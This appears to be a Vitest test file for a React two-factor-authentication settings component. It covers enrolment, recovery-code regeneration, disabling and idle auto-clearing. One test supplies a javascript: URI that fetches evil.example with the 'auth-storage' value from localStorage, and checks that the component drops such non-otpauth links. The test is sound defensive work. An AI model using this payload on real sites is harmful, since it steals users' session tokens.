import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, fireEvent, waitFor, act } from '../../../test/test-utils';
import { MfaSection } from '../MfaSection';
import { DEFAULT_SENSITIVE_IDLE_MS } from '../../../hooks/useAutoClearOnIdle';

let recoveryStatus: { remaining: number; total: number } | undefined;
let statusLoading = false;
let statusError = false;
let enrollPending = false;
let activatePending = false;
let disablePending = false;
let regeneratePending = false;

const enrollMutate = vi.fn();
const activateMutate = vi.fn();
const disableMutate = vi.fn();
const regenerateMutate = vi.fn();

vi.mock('../index', () => ({
    useMfaRecoveryStatus: () => ({ data: recoveryStatus, isLoading: statusLoading, isError: statusError }),
    useEnrollMfa: () => ({ mutate: enrollMutate, isPending: enrollPending }),
    useActivateMfa: () => ({ mutate: activateMutate, isPending: activatePending }),
    useDisableMfa: () => ({ mutateAsync: disableMutate, isPending: disablePending }),
    useRegenerateRecoveryCodes: () => ({ mutateAsync: regenerateMutate, isPending: regeneratePending }),
}));

beforeEach(() => {
    recoveryStatus = { remaining: 0, total: 0 };
    statusLoading = false;
    statusError = false;
    enrollPending = false;
    activatePending = false;
    disablePending = false;
    regeneratePending = false;
    enrollMutate.mockReset();
    activateMutate.mockReset();
    disableMutate.mockReset();
    regenerateMutate.mockReset();
});

describe('MfaSection', () => {
    it('shows an Enable action when MFA is off', () => {
        render(<MfaSection />);
        expect(screen.getByText('Two-Factor Authentication')).toBeInTheDocument();
        expect(screen.getByRole('button', { name: 'Enable' })).toBeInTheDocument();
        expect(screen.queryByText('Enabled')).not.toBeInTheDocument();
        expect(screen.getByText(/second factor at login/i)).toBeInTheDocument();
    });

    it('shows status + management when MFA is on', () => {
        recoveryStatus = { remaining: 8, total: 10 };
        render(<MfaSection />);
        expect(screen.getByText('Enabled')).toBeInTheDocument();
        expect(screen.getByText('8 of 10 recovery codes remaining')).toBeInTheDocument();
        expect(screen.getByRole('button', { name: 'Disable' })).toBeInTheDocument();
        expect(screen.getByRole('button', { name: 'Regenerate codes' })).toBeInTheDocument();
        // Not low on codes → no warning.
        expect(screen.queryByText(/running low/i)).not.toBeInTheDocument();
    });

    it('warns when recovery codes are running low', () => {
        recoveryStatus = { remaining: 2, total: 10 };
        render(<MfaSection />);
        expect(screen.getByText(/running low on recovery codes/i)).toBeInTheDocument();
    });

    it('opens the enrolment modal and begins enrolment on Enable', () => {
        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Enable' }));
        expect(screen.getByText('Set up two-factor authentication')).toBeInTheDocument();
        // The modal kicks off enrolment.
        expect(enrollMutate).toHaveBeenCalled();
    });

    it('opens the regenerate re-auth modal', () => {
        recoveryStatus = { remaining: 5, total: 10 };
        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Regenerate codes' }));
        expect(screen.getByText('Regenerate recovery codes')).toBeInTheDocument();
        expect(screen.getByRole('button', { name: 'Regenerate' })).toBeInTheDocument();
    });

    it('opens the disable re-auth modal', () => {
        recoveryStatus = { remaining: 5, total: 10 };
        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Disable' }));
        expect(screen.getByText('Disable two-factor authentication')).toBeInTheDocument();
        expect(screen.getByRole('button', { name: 'Disable 2FA' })).toBeInTheDocument();
    });

    it('shows a spinner instead of enable/disable while status is loading, defaulting counts safely', () => {
        recoveryStatus = undefined;
        statusLoading = true;
        render(<MfaSection />);
        expect(screen.queryByRole('button', { name: 'Enable' })).not.toBeInTheDocument();
        expect(screen.queryByRole('button', { name: 'Disable' })).not.toBeInTheDocument();
        expect(screen.queryByText('Enabled')).not.toBeInTheDocument();
    });

    it('shows an error message when status fails to load', () => {
        statusError = true;
        render(<MfaSection />);
        expect(screen.getByText('Could not load two-factor status.')).toBeInTheDocument();
    });
});

describe('MfaSection enrolment flow', () => {
    it('walks enrol → verify → recovery codes, with copy-all and Done', async () => {
        enrollMutate.mockImplementation((_vars, opts) => {
            opts.onSuccess({ secret: 'JBSWY3DPEHPK3PXP', otpauth_uri: 'otpauth://totp/test' });
        });
        activateMutate.mockImplementation((code, opts) => {
            expect(code).toBe('123456');
            opts.onSuccess(['code-1', 'code-2']);
        });

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Enable' }));

        expect(screen.getByText('JBSWY3DPEHPK3PXP')).toBeInTheDocument();
        expect(screen.getByRole('link', { name: /open in authenticator app/i })).toHaveAttribute(
            'href',
            'otpauth://totp/test'
        );

        fireEvent.change(screen.getByLabelText('6-digit code'), { target: { value: '123456' } });
        fireEvent.click(screen.getByRole('button', { name: /verify/i }));

        expect(screen.getByText('code-1')).toBeInTheDocument();
        expect(screen.getByText('code-2')).toBeInTheDocument();

        // Copy-all toggles from "Copy all" to "Copied".
        fireEvent.click(screen.getByRole('button', { name: 'Copy all' }));
        await waitFor(() => expect(screen.getByRole('button', { name: 'Copied' })).toBeInTheDocument());

        fireEvent.click(screen.getByRole('button', { name: 'Done' }));
        expect(screen.queryByText('Set up two-factor authentication')).not.toBeInTheDocument();
    });

    it('shows an error message (Error.message) when starting enrolment fails', () => {
        enrollMutate.mockImplementation((_vars, opts) => {
            opts.onError(new Error('network down'));
        });

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Enable' }));

        expect(screen.getByText('network down')).toBeInTheDocument();
    });

    it('omits the auth link when otpauth_uri has a non-otpauth scheme (XSS defense-in-depth)', () => {
        enrollMutate.mockImplementation((_vars, opts) => {
            opts.onSuccess({
                secret: 'JBSWY3DPEHPK3PXP',
                otpauth_uri: "javascript:fetch('https://evil.example/x?c='+localStorage.getItem('auth-storage'))",
            });
        });

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Enable' }));

        expect(screen.getByText('JBSWY3DPEHPK3PXP')).toBeInTheDocument();
        expect(screen.queryByRole('link', { name: /open in authenticator app/i })).not.toBeInTheDocument();
    });

    it('shows a fallback error when verification is rejected with no detail, and omits the auth link when uri is empty', () => {
        enrollMutate.mockImplementation((_vars, opts) => {
            opts.onSuccess({ secret: 'SECRET', otpauth_uri: '' });
        });
        activateMutate.mockImplementation((_code, opts) => {
            opts.onError({});
        });

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Enable' }));
        expect(screen.queryByRole('link', { name: /open in authenticator app/i })).not.toBeInTheDocument();

        fireEvent.change(screen.getByLabelText('6-digit code'), { target: { value: '654321' } });
        fireEvent.click(screen.getByRole('button', { name: /verify/i }));

        expect(screen.getByText('Invalid code. Try again.')).toBeInTheDocument();
    });

    it('Cancel resets and closes the enrolment modal', () => {
        enrollMutate.mockImplementation((_vars, opts) => {
            opts.onSuccess({ secret: 'SECRET', otpauth_uri: 'otpauth://x' });
        });

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Enable' }));
        expect(screen.getByText('SECRET')).toBeInTheDocument();

        fireEvent.click(screen.getByRole('button', { name: 'Cancel' }));
        expect(screen.queryByText('Set up two-factor authentication')).not.toBeInTheDocument();
    });

    it('shows a spinner while enrolment begins, before the setup key is available', () => {
        enrollPending = true;
        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Enable' }));
        expect(screen.queryByLabelText('6-digit code')).not.toBeInTheDocument();
    });

    it('shows a spinner on the Verify & enable button while activation is pending', () => {
        activatePending = true;
        enrollMutate.mockImplementation((_vars, opts) => {
            opts.onSuccess({ secret: 'SECRET', otpauth_uri: 'otpauth://x' });
        });

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Enable' }));

        const submitButton = screen.getByRole('button', { name: /verify/i });
        expect(submitButton).toBeDisabled();
        expect(submitButton.querySelector('svg.animate-spin')).toBeInTheDocument();
    });
});

describe('MfaSection regenerate flow', () => {
    beforeEach(() => {
        recoveryStatus = { remaining: 5, total: 10 };
    });

    it('submits a 6-digit code as `code`, shows returned codes, and Done closes the modal', async () => {
        regenerateMutate.mockResolvedValue(['new-1', 'new-2']);

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Regenerate codes' }));
        fireEvent.change(screen.getByLabelText('Authenticator code or password'), { target: { value: '123456' } });
        fireEvent.click(screen.getByRole('button', { name: 'Regenerate' }));

        await waitFor(() => expect(regenerateMutate).toHaveBeenCalledWith({ code: '123456' }));
        expect(await screen.findByText('new-1')).toBeInTheDocument();

        fireEvent.click(screen.getByRole('button', { name: 'Done' }));
        expect(screen.queryByText('Regenerate recovery codes')).not.toBeInTheDocument();
    });

    it('treats non-6-digit input as a password, and closes immediately when no codes are returned', async () => {
        regenerateMutate.mockResolvedValue(undefined);

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Regenerate codes' }));
        fireEvent.change(screen.getByLabelText('Authenticator code or password'), { target: { value: 'hunter2' } });
        fireEvent.click(screen.getByRole('button', { name: 'Regenerate' }));

        await waitFor(() => expect(regenerateMutate).toHaveBeenCalledWith({ password: 'hunter2' }));
        await waitFor(() => expect(screen.queryByText('Regenerate recovery codes')).not.toBeInTheDocument());
    });

    it('shows the server error message when the reauth proof is rejected', async () => {
        regenerateMutate.mockRejectedValue({ response: { data: { message: 'Invalid TOTP code' } } });

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Regenerate codes' }));
        fireEvent.change(screen.getByLabelText('Authenticator code or password'), { target: { value: '000000' } });
        fireEvent.click(screen.getByRole('button', { name: 'Regenerate' }));

        expect(await screen.findByText('Invalid TOTP code')).toBeInTheDocument();
    });

    it('Cancel closes the modal without submitting', () => {
        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Regenerate codes' }));
        fireEvent.change(screen.getByLabelText('Authenticator code or password'), { target: { value: '123456' } });
        fireEvent.click(screen.getByRole('button', { name: 'Cancel' }));

        expect(regenerateMutate).not.toHaveBeenCalled();
        expect(screen.queryByText('Regenerate recovery codes')).not.toBeInTheDocument();
    });
});

describe('MfaSection disable flow', () => {
    beforeEach(() => {
        recoveryStatus = { remaining: 5, total: 10 };
    });

    it('submits proof and closes on success', async () => {
        disableMutate.mockResolvedValue(undefined);

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Disable' }));
        fireEvent.change(screen.getByLabelText('Authenticator code or password'), { target: { value: '123456' } });
        fireEvent.click(screen.getByRole('button', { name: 'Disable 2FA' }));

        await waitFor(() => expect(disableMutate).toHaveBeenCalledWith({ code: '123456' }));
        await waitFor(() => expect(screen.queryByText('Disable two-factor authentication')).not.toBeInTheDocument());
    });

    it('shows a fallback error message when the rejection carries no detail', async () => {
        disableMutate.mockRejectedValue({});

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Disable' }));
        fireEvent.change(screen.getByLabelText('Authenticator code or password'), { target: { value: '123456' } });
        fireEvent.click(screen.getByRole('button', { name: 'Disable 2FA' }));

        expect(await screen.findByText('Invalid code or password.')).toBeInTheDocument();
    });

    it('shows a spinner on the confirm button of a ReauthModal while the action is pending', () => {
        disablePending = true;

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Disable' }));
        fireEvent.change(screen.getByLabelText('Authenticator code or password'), { target: { value: '123456' } });

        const confirmButton = screen.getByRole('button', { name: 'Disable 2FA' });
        expect(confirmButton).toBeDisabled();
        expect(confirmButton.querySelector('svg.animate-spin')).toBeInTheDocument();
    });
});

// G28: recovery codes must not linger indefinitely with no explicit Done/Cancel.
describe('MfaSection auto-clear (G28)', () => {
    afterEach(() => {
        vi.useRealTimers();
    });

    it('auto-closes the enrolment modal after the idle timeout elapses, once recovery codes are shown', async () => {
        enrollMutate.mockImplementation((_vars, opts) => {
            opts.onSuccess({ secret: 'JBSWY3DPEHPK3PXP', otpauth_uri: 'otpauth://totp/test' });
        });
        activateMutate.mockImplementation((_code, opts) => {
            opts.onSuccess(['idle-code-1', 'idle-code-2']);
        });
        vi.useFakeTimers();

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Enable' }));
        fireEvent.change(screen.getByLabelText('6-digit code'), { target: { value: '123456' } });
        fireEvent.click(screen.getByRole('button', { name: /verify/i }));
        expect(screen.getByText('idle-code-1')).toBeInTheDocument();

        await act(async () => {
            await vi.advanceTimersByTimeAsync(DEFAULT_SENSITIVE_IDLE_MS);
        });

        expect(screen.queryByText('idle-code-1')).not.toBeInTheDocument();
        expect(screen.queryByText('Set up two-factor authentication')).not.toBeInTheDocument();
    });

    it('auto-closes the regenerate modal when the tab is backgrounded, once new codes are shown', async () => {
        recoveryStatus = { remaining: 5, total: 10 };
        regenerateMutate.mockResolvedValue(['bg-code-1', 'bg-code-2']);

        render(<MfaSection />);
        fireEvent.click(screen.getByRole('button', { name: 'Regenerate codes' }));
        fireEvent.change(screen.getByLabelText('Authenticator code or password'), { target: { value: '123456' } });
        fireEvent.click(screen.getByRole('button', { name: 'Regenerate' }));
        expect(await screen.findByText('bg-code-1')).toBeInTheDocument();

        Object.defineProperty(document, 'visibilityState', { value: 'hidden', configurable: true });
        act(() => {
            document.dispatchEvent(new Event('visibilitychange'));
        });

        expect(screen.queryByText('bg-code-1')).not.toBeInTheDocument();
        expect(screen.queryByText('Regenerate recovery codes')).not.toBeInTheDocument();

        Object.defineProperty(document, 'visibilityState', { value: 'visible', configurable: true });
    });
});
